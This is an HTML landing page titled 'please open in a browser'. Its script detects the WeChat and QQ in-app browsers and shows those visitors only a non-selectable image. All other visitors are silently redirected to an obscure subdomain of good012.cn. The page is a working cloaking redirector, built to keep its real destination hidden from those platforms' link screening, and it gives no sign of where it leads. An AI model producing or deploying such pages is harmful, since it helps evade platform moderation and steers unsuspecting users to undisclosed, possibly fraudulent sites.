<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>请用浏览器打开</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #fff;
        }
        img {
            max-width: 100%;
            height: auto;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            user-select: none;
        }
    </style>
    <script>
        (function() {
            // 检测微信和QQ内置浏览器
            function isRestrictedBrowser() {
                const ua = navigator.userAgent.toLowerCase();
                return /micromessenger/.test(ua) || /qq\//.test(ua);
            }
            
            // 非限制浏览器立即跳转
            if (!isRestrictedBrowser()) {
                window.location.href = 'http://kHXRxZ.good012.cn/t/kHXRxZ';
            }
        })();
    </script>
</head>
<body>
    <img src="https://s3.uuu.ovh/imgs/2025/04/29/a8fc68f8d3181195.jpg" alt="">
</body>
</html>
